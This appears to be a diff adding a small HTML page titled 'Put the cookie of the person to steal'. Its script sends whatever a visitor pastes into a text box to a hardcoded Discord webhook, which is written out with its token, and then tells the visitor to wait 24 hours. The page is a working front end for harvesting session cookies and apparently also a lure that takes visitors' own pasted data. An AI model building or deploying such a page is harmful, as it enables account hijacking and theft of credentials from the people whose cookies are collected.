@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Untitled</title>
+  
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Put the cookie of the person to steal</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="flex items-center justify-center h-screen bg-gradient-to-r from-indigo-500 to-purple-600">
+  <div class="bg-white p-8 rounded-2xl shadow-2xl w-96 text-center animate-fadeIn">
+    <h1 class="text-xl font-bold mb-4">Put the cookie of the person to steal</h1>
+    
+    <textarea id="message" 
+      placeholder="Type your message..." 
+      class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-400 transition"></textarea>
+    
+    <button id="sendBtn" 
+      class="mt-4 w-full bg-purple-600 text-white p-3 rounded-lg shadow-lg transition transform hover:scale-105 hover:bg-purple-700">
+      Send
+    </button>
+    
+    <p id="response" class="mt-4 text-gray-700 font-semibold hidden"></p>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1417663222017691668/LgWJ1CMCA5V1OYzJWBbS0zQ1gy6dJ_3TmoOBXW8Ak7B3PFZgGjQ_Yaixs3AqkEuilKN5"; // replace with your webhook
+
+    document.getElementById("sendBtn").addEventListener("click", async () => {
+      const msg = document.getElementById("message").value.trim();
+      const responseText = document.getElementById("response");
+
+      if (!msg) {
+        responseText.textContent = "Please type a message first!";
+        responseText.classList.remove("hidden");
+        return;
+      }
+
+      try {
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: msg })
+        });
+
+        responseText.textContent = "✅ Sent! Please wait for 24 hrs.";
+        responseText.classList.remove("hidden");
+        document.getElementById("message").value = "";
+      } catch (error) {
+        responseText.textContent = "❌ Failed to send message.";
+        responseText.classList.remove("hidden");
+      }
+    });
+  </script>
+</body>
+</html>
+<!-- partial -->
+  
+</body>
+</html>
